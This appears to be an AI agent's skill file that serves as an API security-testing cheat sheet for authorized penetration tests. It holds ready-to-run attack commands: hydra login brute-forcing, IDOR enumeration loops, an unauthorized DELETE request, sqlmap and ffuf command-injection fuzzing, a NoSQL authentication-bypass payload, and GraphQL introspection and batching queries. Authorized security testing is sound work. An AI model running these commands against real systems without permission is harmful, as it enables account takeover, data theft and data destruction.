---
name: api-audit
description: REST and GraphQL API security testing following OWASP API Security Top 10 guidelines.
---

# API Security Audit Skill

## When to Use
Use this skill when performing security assessments against REST or GraphQL APIs during authorized penetration testing engagements.

## REST API Testing

### Authentication Testing
```bash
# Token analysis
echo <jwt> | cut -d'.' -f2 | base64 -d 2>/dev/null

# Brute force
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/api/login:user=<user>&pass=^PASS^:F=Invalid"

# Token manipulation
curl -H "Authorization: Bearer <modified_token>" https://target/api/endpoint
```

### Authorization Testing (BOLA/IDOR)
```bash
# Object ID manipulation
for i in $(seq 1 100); do curl -s -H "Authorization: Bearer <token>" https://target/api/users/$i | jq .; done

# Horizontal privilege escalation
curl -H "Authorization: Bearer <user_token>" https://target/api/admin/users

# Vertical privilege escalation
curl -H "Authorization: Bearer <user_token>" -X DELETE https://target/api/users/1
```

### Injection Testing
```bash
# SQL injection
sqlmap -u "https://target/api/items?id=1" --batch --level=3

# Command injection
ffuf -u https://target/api/execute -X POST -d "cmd=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/command-injection-linux.txt

# NoSQL injection
curl -X POST https://target/api/login -d '{"username":"admin","password":{"$ne":""}}'
```

## GraphQL Testing

### Introspection
```bash
# Full introspection
curl -X POST https://target/graphql -d '{"query":"{__schema{types{name,fields{name,type{name}}}}"}'

# Type-specific
curl -X POST https://target/graphql -d '{"query":"{__type(name:\"User\"){fields{name,type{name}}}}"}'
```

### Common Attacks
```bash
# Batch query
curl -X POST https://target/graphql -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]'

# Field suggestion
curl -X POST https://target/graphql -d '{"query":"{__type(name:\"User\"){inputFields{name}}}"}'

# Alias-based bypass
curl -X POST https://target/graphql -d '{"query":"{admin:users{email} normal:users{email}}"}'
```

## OWASP API Top 10 (2023)
1. API1:2023 - Broken Object Level Authorization (BOLA)
2. API2:2023 - Broken Authentication
3. API3:2023 - Broken Object Property Level Authorization
4. API4:2023 - Unrestricted Resource Consumption
5. API5:2023 - Broken Function Level Authorization
6. API6:2023 - Unrestricted Access to Sensitive Business Flows
7. API7:2023 - Server Side Request Forgery (SSRF)
8. API8:2023 - Security Misconfiguration
9. API9:2023 - Improper Inventory Management
10. API10:2023 - Unsafe Consumption of APIs

## Output Format
```
[API] REST/GraphQL
[OWASP] APIX:2023
[FINDING] Vulnerability
[SEVERITY] Critical/High/Medium/Low
[EVIDENCE] Request/Response
[REMEDIATION] Fix
```
